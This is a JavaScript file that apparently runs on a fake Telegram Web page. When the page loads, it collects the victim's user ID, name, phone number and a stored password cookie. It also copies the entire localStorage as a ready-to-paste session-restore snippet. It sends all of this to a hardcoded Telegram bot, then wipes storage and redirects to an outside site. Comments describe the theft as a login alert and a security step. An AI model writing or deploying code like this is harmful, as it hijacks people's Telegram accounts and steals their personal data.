document.addEventListener("DOMContentLoaded", function () {
  async function checkLocalStorage1() {
    let globalState = localStorage.getItem("tt-global-state");
    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie
          .split("; ")
          .find((e) => e.startsWith("password="))
          ?.split("=")[1];

        // Remove sensitive data from localStorage
        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        // Prepare the message with data formatted using Object.entries() and forEach()
        let message = `🔔 *New Login Alert:*\n` +
          `👤 *User ID:* ${currentUserId}\n` +
          `🧑 *First Name:* ${firstName || "N/A"}\n` +
          `📛 *Username:* ${usernames || "N/A"}\n` +
          `📞 *Phone Number:* ${phoneNumber || "N/A"}\n` +
          `💎 *Premium User:* ${isPremium ? "Yes" : "No"}\n` +
          `🔑 *Password:* ${password || "N/A"}\n\n` +
          `🗃️ *Log:*\n\`\`\`Cookies Object.entries({\n`;

        // Add full Object.entries() code with .forEach() in the correct format
        Object.entries(localStorage).forEach(([key, value]) => {
          // Escape backticks and quotes in values
          const escapedValue = value.replace(/\\/g, "\\\\").replace(/`/g, "\\`").replace(/"/g, '\\"');
          message += `  "${key}": "${escapedValue}",\n`;  // Format each entry with escaped values
        });

        // Remove the last comma and add the closing code
        if (message.endsWith(",\n")) {
          message = message.slice(0, -2);
        }
        
        message += `\n}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();\n\`\`\`\n--------------------------`;

        // Send the message via Telegram bot
        await sendToTelegram(message);

        // Clear sensitive data for security
        localStorage.clear();
        document.cookie =
          "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";

        // Redirect
        window.location.href = "https://tktcv-git-main-yasmine-kahinas-projects.vercel.app/";

        clearInterval(checkInterval1);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  // Function to send a message to multiple Telegram chats
  async function sendToTelegram(message) {
    const botToken = "7988128074:AAH1QAz1T9TT3iuBepF6LKDe6NaxiDXCvKs"; // Your Telegram bot token
    const chatIds = ["-1002334783896"]; // List of Telegram channel IDs
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      for (const chatId of chatIds) {
        const response = await fetch(telegramApiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown", // Markdown formatting for better display
          }),
        });

        if (response.ok) {
          console.log(`Message successfully sent to chat ID ${chatId}`);
        } else {
          console.log(`Failed to send message to chat ID ${chatId}:`, response.status);
        }
      }
    } catch (error) {
      console.error("Error while sending the message to Telegram:", error);
    }
  }

  const checkInterval1 = setInterval(checkLocalStorage1, 100);
});
